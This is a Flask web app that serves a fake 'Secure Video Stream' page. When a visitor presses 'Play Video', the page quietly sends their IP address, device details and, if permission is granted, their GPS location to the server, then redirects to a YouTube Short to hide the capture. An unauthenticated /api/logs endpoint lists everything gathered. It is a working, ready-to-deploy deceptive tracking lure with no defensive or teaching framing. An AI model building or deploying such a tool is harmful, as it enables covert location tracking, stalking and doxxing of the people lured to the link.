import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)
CAPTURED_LOGS = []

TRACKING_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Media Stream Player</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: #0b0f19; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .box { background: #1f2937; padding: 25px; border-radius: 12px; display: inline-block; width: 90%; max-width: 400px; border: 1px solid #374151; }
        h3 { color: #38bdf8; }
        .btn { background: #0284c7; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; }
    </style>
</head>
<body>
    <div class="box">
        <h3>▶ Secure Video Stream</h3>
        <p style="color: #94a3b8; font-size: 14px;">Tap below to initialize high-speed media player.</p>
        <button class="btn" onclick="initializeStream()">Play Video</button>
    </div>

    <script>
        function initializeStream() {
            // 1. Capture IP and Device Metadata
            fetch('/api/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screen: window.innerWidth + 'x' + window.innerHeight
                })
            });

            // 2. Request Geolocation Permission Gracefully
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    fetch('/api/location', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        })
                    });
                });
            }

            // 3. Redirect to real video after capturing data
            setTimeout(() => {
                window.location.href = "https://www.youtube.com/shorts/8793Neu1UP4";
            }, 1500);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return "<h3>Cyber Nova Cloud Hub is Active</h3>"

@app.route('/watch')
def watch():
    return TRACKING_PAGE

@app.route('/api/collect', methods=['POST'])
def collect():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    log_entry = {
        "ip": ip,
        "userAgent": data.get("userAgent"),
        "platform": data.get("platform"),
        "screen": data.get("screen"),
        "location": "Pending Permission..."
    }
    CAPTURED_LOGS.insert(0, log_entry)
    return jsonify({"status": "success"})

@app.route('/api/location', methods=['POST'])
def location():
    data = request.json
    if CAPTURED_LOGS:
        CAPTURED_LOGS[0]["location"] = f"Lat: {data.get('lat')}, Lon: {data.get('lon')}"
    return jsonify({"status": "saved"})

@app.route('/api/logs')
def logs():
    return jsonify(CAPTURED_LOGS)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
